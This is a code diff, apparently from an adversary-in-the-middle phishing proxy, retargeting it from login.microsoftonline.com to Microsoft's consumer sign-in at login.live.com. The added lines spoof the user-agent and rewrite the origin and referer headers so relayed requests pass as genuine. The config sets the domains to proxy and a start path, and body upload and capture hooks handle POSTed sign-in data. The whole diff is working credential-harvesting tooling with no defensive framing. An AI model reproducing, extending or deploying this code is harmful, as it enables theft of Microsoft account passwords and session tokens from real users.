@@ -94,23 +94,23 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
     }
 
     execute(clientContext) {
-        this.req.headers['user-agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.61 Safari/537.36'
+        this.req.headers['user-agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'
+        this.req.headers['origin'] = this.req.headers['origin']? this.req.headers['origin'].replace(clientContext.hostname, 'login.live.com') : ''
+        this.req.headers['referer'] = this.req.headers['referer']? this.req.headers['referer'].replace(clientContext.hostname, 'login.live.com') : ''
 
-        this.req.headers['accept-encoding'] = 'gzip, br'
+        // this.req.headers['accept-encoding'] = 'gzip, br'
         if (this.req.method === 'POST') {
             super.uploadRequestBody(clientContext.currentDomain, clientContext)
             // if (this.req.url.startsWith('/ppsecure/post.srf?')) {
             //     super.uploadRequestBody(clientContext.currentDomain, clientContext)
             //     clientContext.setLogAvailable(true)
             // }
-            
-            super.captureBody(clientContext.currentDomain, clientContext)
-
         }
-        if (this.req.url.startsWith('/identity/confirm')) {
-            clientContext.currentDomain = 'account.live.com'
 
-        }
+        // if (this.req.url.startsWith('/identity/confirm')) {
+        //     clientContext.currentDomain = 'account.live.com'
+
+        // }
 
 
         // Check for redirect
@@ -144,14 +144,15 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
 
 
 const configExport = {
-    CURRENT_DOMAIN: 'login.microsoftonline.com',
+    CURRENT_DOMAIN: 'login.live.com',
 
     EXTERNAL_FILTERS: 
     [
         'account.live.com',
+        'login.live.com'
     ],
 
-    START_PATH: '/consumers/oauth2/v2.0/authorize?response_type=code&scope=Secrets.ReadWrite.CreatedByApp.Secure+offline_access&client_id=229f4d61-07eb-454a-9453-d27bba7cc95b&redirect_uri=https://login.microsoftonline.com/common/oauth2/nativeclient&response_mode=query&state={%22id%22:%22fiedbfgcleddlbcmgdigjgdfcggjcion%22}',
+    START_PATH: '/', //'/consumers/oauth2/v2.0/authorize?response_type=code&scope=Secrets.ReadWrite.CreatedByApp.Secure+offline_access&client_id=229f4d61-07eb-454a-9453-d27bba7cc95b&redirect_uri=https://login.microsoftonline.com/common/oauth2/nativeclient&response_mode=query&state={%22id%22:%22fiedbfgcleddlbcmgdigjgdfcggjcion%22}',
     PRE_HANDLERS:
         [
         ],
